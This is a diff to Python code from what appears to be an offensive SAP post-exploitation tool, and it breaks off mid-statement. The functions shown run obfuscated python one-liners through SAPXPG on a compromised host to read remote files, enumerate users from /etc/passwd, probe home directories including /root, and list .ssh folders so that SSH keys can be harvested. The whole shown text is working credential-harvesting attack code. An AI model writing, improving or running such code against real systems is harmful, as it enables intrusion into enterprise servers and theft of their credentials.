@@ -205,7 +205,14 @@ def _make_exec_fn(node: SAPNode, channel: str = "auto"):
 
 def _exfil_file(run_cmd, path: str, max_size: int = 65536) -> bytes | None:
     """Read a remote file via chunked python3 base64 reads."""
-    sz_out = run_cmd(f"wc -c < '{path}' 2>/dev/null").strip()
+    # Get file size via python3 directly (no /bin/sh) — reliable
+    # through SAPXPG on all kernel versions.
+    _sz_code = f"print(__import__('os').path.getsize('{path}'))"
+    _run_py_fn = getattr(run_cmd, "_run_py", None)
+    if _run_py_fn:
+        sz_out = _run_py_fn(_sz_code).strip()
+    else:
+        sz_out = run_cmd(f"wc -c < '{path}' 2>/dev/null").strip()
     m = re.search(r"(\d+)", sz_out)
     if not m:
         return None
@@ -266,67 +273,89 @@ def ssh_harvest(node: SAPNode, state: SAPMAPState,
     result["channel"] = label
     print(f"[*] {sid}: ssh_harvest — channel: {label}")
 
-    # ---- Step 1: enumerate OS users from /etc/passwd
-    # Use python3 directly (not /bin/sh) to avoid TLV command-echo
-    # contamination that garbles colon-delimited passwd lines.
-    # No spaces in code — SAPXPG splits PARAMS on spaces.
+    # ---- Step 1: enumerate OS users
+    # Primary: detect current user's home via python3 (always works —
+    # SAPXPG runs as <sid>adm, python3 os.path.expanduser is reliable).
     _run_py = exec_fn._run_py
-    _passwd_py = (
-        "exec(\"import\\x20os\\n"
-        "skip={'nologin','false'}\\n"
-        "for\\x20L\\x20in\\x20open('/etc/passwd'):\\n"
-        "\\x20p=L.strip().split(':')\\n"
-        "\\x20if\\x20len(p)<7:continue\\n"
-        "\\x20h=p[5];s=os.path.basename(p[6])\\n"
-        "\\x20if\\x20not\\x20h\\x20or\\x20s\\x20in\\x20skip:continue\\n"
-        "\\x20print(p[0]+':'+p[2]+':'+h+':'+p[6])\\n"
-        "\")"
-    )
-    passwd_out = _run_py(_passwd_py)
     os_users = []
     home_dirs = {}
-    for line in passwd_out.splitlines():
-        line = line.strip()
-        if not line:
-            continue
-        parts = line.split(":")
-        if len(parts) < 4:
-            continue
-        username, uid_str, home, shell = parts[0], parts[1], parts[2], parts[3]
-        if not home or home in ("/dev/null", "/nonexistent"):
-            continue
-        os_users.append({
-            "username": username,
-            "uid": uid_str,
-            "home": home,
-            "shell": shell,
-        })
-        home_dirs[username] = home
+    sidadm = (sid or "").lower() + "adm"
+
+    # 1a. Get current user + home via python3 (guaranteed, no /etc/passwd)
+    _who_code = "print(__import__('getpass').getuser()+'|'+__import__('os').path.expanduser('~'))"
+    who_out = _run_py(_who_code).strip()
+    cur_user = cur_home = ""
+    for ln in who_out.splitlines():
+        ln = ln.strip()
+        if "|" in ln:
+            parts = ln.split("|", 1)
+            cur_user, cur_home = parts[0].strip(), parts[1].strip()
+            break
+    if cur_user and cur_home:
+        home_dirs[cur_user] = cur_home
+        os_users.append({"username": cur_user, "uid": "", "home": cur_home, "shell": ""})
+        print(f"  [*] {sid}: current user = {cur_user}, home = {cur_home}")
+
+    # 1b. Try /etc/passwd for additional users (may fail on hardened systems)
+    passwd_raw = _exfil_file(exec_fn, "/etc/passwd", max_size=65536)
+    if passwd_raw:
+        for line in passwd_raw.decode("utf-8", errors="replace").splitlines():
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            parts = line.split(":")
+            if len(parts) < 7:
+                continue
+            username = parts[0]
+            uid_str = parts[2]
+            home = parts[5]
+            shell = parts[6]
+            if not home or home in ("/dev/null", "/nonexistent"):
+                continue
+            shell_base = os.path.basename(shell)
+            if shell_base in ("nologin", "false"):
+                continue
+            if username not in home_dirs:
+                os_users.append({
+                    "username": username,
+                    "uid": uid_str,
+                    "home": home,
+                    "shell": shell,
+                })
+                home_dirs[username] = home
+    else:
+        print(f"  [*] {sid}: /etc/passwd not readable — "
+              f"using current user + SID-derived homes")
+
     result["os_users"] = os_users
     print(f"[*] {sid}: ssh_harvest — {len(os_users)} users with "
           f"login shells")
-    if os_users:
-        print(f"  [*] homes: "
-              + ", ".join(f"{u['username']}={u['home']}"
-                          for u in os_users[:10]))
 
     # ---- Step 2: discover SSH directories
-    # Use python3 directly per home dir for reliable output.
+    # For each home dir, use a short python3 one-liner to list .ssh
+    # contents.  Must fit in SAPXPG PARAMS (255 bytes).
     homes_to_check = list(set(home_dirs.values()))
     if "/root" not in homes_to_check:
         homes_to_check.append("/root")
+    # SAP convention fallbacks
+    sidadm_home = f"/home/{sidadm}"
+    if sidadm_home not in homes_to_check:
+        homes_to_check.append(sidadm_home)
+        if sidadm not in home_dirs:
+            home_dirs[sidadm] = sidadm_home
 
     ssh_dirs = {}
     for home in homes_to_check:
         ssh_path = f"{home}/.ssh"
-        _ls_py = (
+        # ~90 chars — well within 255-byte PARAMS limit
+        _ls_code = (
             f"exec(\"import\\x20os\\n"
             f"d='{ssh_path}'\\n"
             f"if\\x20os.path.isdir(d):\\n"
-            f"\\x20for\\x20f\\x20in\\x20os.listdir(d):print(f)\\n"
+            f"\\x20[print(f)for\\x20f\\x20in\\x20os.listdir(d)]\\n"
             f"\")"
         )
-        ls_out = _run_py(_ls_py)
+        ls_out = exec_fn._run_py(_ls_code)
         if not ls_out or not ls_out.strip():
             continue
         files = [fn.strip() for fn in ls_out.splitlines()
